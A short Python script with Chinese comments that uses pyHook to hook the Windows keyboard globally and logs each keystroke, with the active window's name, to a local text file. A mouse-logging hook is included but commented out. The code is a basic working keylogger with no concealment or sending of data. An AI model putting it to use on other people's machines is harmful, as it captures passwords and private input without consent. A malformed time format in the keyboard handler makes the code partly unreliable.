import pythoncom 
import pyHook 
import time 

'''
def onMouseEvent(event): 
    "處理鼠標事件" 
    fobj.writelines('-' * 20 + 'MouseEvent Begin' + '-' * 20 + '\n') 
    fobj.writelines("Current Time:%s\n" % time.strftime("%a, %d %b %Y %H:%M:%S ", time.gmtime())) 
    fobj.writelines("MessageName:%s\n" % str(event.MessageName)) 
    fobj.writelines("Message:%d\n" % event.Message) 
    fobj.writelines( "Time_sec:%d\n" % event.Time) 
    fobj.writelines("Window:%s\n" % str(event.Window)) 
    fobj.writelines("WindowName:%s\n" % str(event. WindowName)) 
    fobj.writelines("Position:%s\n" % str(event.Position))
    fobj.writelines('-' * 20 + 'MouseEvent End' + '-' * 20 + '\n') 
   return True 
'''

def onKeyboardEvent(event): 
        "處理鍵盤事件"   
        fobj.writelines('-' * 20 + ' Keyboard Begin' + '-' * 20 + '\n') 
        fobj.writelines("Current Time:%s\n" % time.strftime("%a, %d %b %Y %H:%M:% S", time.gmtime())) 
        fobj.writelines("MessageName:%s\n" % str(event.MessageName)) 
        fobj.writelines("Message:%d\n" % event.Message) 
        fobj.writelines ("Time:%d\n" % event.Time) 
        fobj.writelines("Window:%s\n" % str(event.Window)) 
        fobj.writelines("WindowName:%s\n" % str(event .WindowName)) 
        fobj.writelines("Ascii_code: %d\n" % event.Ascii) 
        fobj.writelines("Ascii_char:%s\n" % chr(event.Ascii))
        fobj.writelines("Key:%s\n" % str(event.Key)) 
        fobj.writelines('-' * 20 + 'Keyboard End' + '-' * 20 + '\n') 
        return True 

if __name__ == "__main__": 
  
       
        #打開日誌文件
        file_name = "D:\Xanonymous\Downloads\hook_log.txt" 
        fobj = open(file_name,  'w')       

        #創建hook句柄
        hm = pyHook.HookManager() 


        #監控鍵盤
        hm.KeyDown = onKeyboardEvent 
        hm.HookKeyboard() 

        '''
        #監控鼠標
        hm.MouseAll = onMouseEvent 
        hm.HookMouse() 
        ''' 
        #循環獲取消息
        pythoncom.PumpMessages() 
   
        #關閉日誌文件
        fobj.close()
